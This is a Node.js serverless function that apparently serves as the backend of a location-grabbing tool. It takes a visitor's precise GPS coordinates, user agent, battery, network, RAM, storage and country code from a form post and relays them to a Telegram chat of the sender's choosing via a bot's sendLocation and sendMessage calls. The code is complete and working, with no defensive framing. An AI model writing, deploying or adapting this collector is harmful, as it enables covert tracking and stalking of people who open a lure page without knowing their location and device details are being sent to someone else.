const fetch = require('node-fetch');
const FormData = require('form-data');
const formidable = require('formidable');

module.exports = async (req, res) => {
  const botToken = process.env.TOKEN;

  if (!botToken) {
    console.error('Bot token not configured.');
    return res.status(500).json({ ok: false, error: 'Bot token not configured.' });
  }

  if (req.method !== 'POST') {
    console.error('Method not allowed:', req.method);
    return res.status(405).json({ ok: false, error: 'Method not allowed.' });
  }

  const form = new formidable.IncomingForm();
  form.parse(req, async (err, fields, files) => {
    if (err) {
      console.error('Error parsing form:', err);
      return res.status(500).json({ ok: false, error: 'Failed to parse form data.' });
    }

    const chatId = fields.chat_id;
    const latitude = fields.latitude;
    const longitude = fields.longitude;
    const userAgent = fields.user_agent;
    const timezone = fields.timezone;
    const batteryLevel = fields.battery_level;
    const batteryCharging = fields.battery_charging;
    const networkType = fields.network_type;
    const networkSpeed = fields.network_speed;
    const ram = fields.ram;
    const storage = fields.storage;
    const countryCode = fields.country_code;

    if (!chatId || !latitude || !longitude) {
      console.error('Missing required parameters');
      return res.status(400).json({ ok: false, error: 'Missing required parameters.' });
    }

    try {
      const now = new Date();
      const dateTime = now.toLocaleString();
      
      const messageText = `*📌 New Data Received:*\n\n` +
        `*📍 Latitude:* ${latitude}\n` +
        `*📍 Longitude:* ${longitude}\n` +
        `*📱 User Agent:* ${userAgent || 'Unknown'}\n` +
        `*📅 Date:* ${dateTime}\n` +
        `*🌍 Timezone:* ${timezone || 'Unknown'}\n` +
        `*🔋 Battery:* ${batteryLevel || 'Unknown'}% (${batteryCharging === 'true' ? 'Charging' : 'Not Charging'})\n` +
        `*📶 Network:* ${networkType || 'Unknown'} (${networkSpeed || 'Unknown'} Mbps)\n` +
        `*📞 Selected Number:* User Denied\n` +
        `*🌐 Country Code:* ${countryCode || 'Unknown'}\n` +
        `*💾 RAM:* ${ram || 'Unknown'} GB\n` +
        `*💽 Storage:* ${storage || 'Unknown'}\n` +
        `*🔒 Permission:* Denied`;

      // First send location
      const locationUrl = `https://api.telegram.org/bot${botToken}/sendLocation`;
      const locationData = {
        chat_id: chatId,
        latitude: latitude,
        longitude: longitude
      };

      const locationResponse = await fetch(locationUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams(locationData)
      });

      const locationResult = await locationResponse.json();

      if (!locationResult.ok) {
        console.error('Telegram API error:', locationResult);
        return res.status(500).json({ ok: false, error: locationResult.description });
      }

      // Then send the additional information as a message
      const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const messageData = {
        chat_id: chatId,
        text: messageText,
        parse_mode: 'Markdown'
      };

      const messageResponse = await fetch(messageUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams(messageData)
      });

      const messageResult = await messageResponse.json();

      if (!messageResult.ok) {
        console.error('Telegram API error:', messageResult);
        return res.status(500).json({ ok: false, error: messageResult.description });
      }

      console.log('Location and data sent successfully');
      return res.status(200).json({ ok: true });
    } catch (error) {
      console.error('Error in sendMedia:', error);
      return res.status(500).json({ ok: false, error: 'Failed to send data: ' + error.message });
    }
  });
};
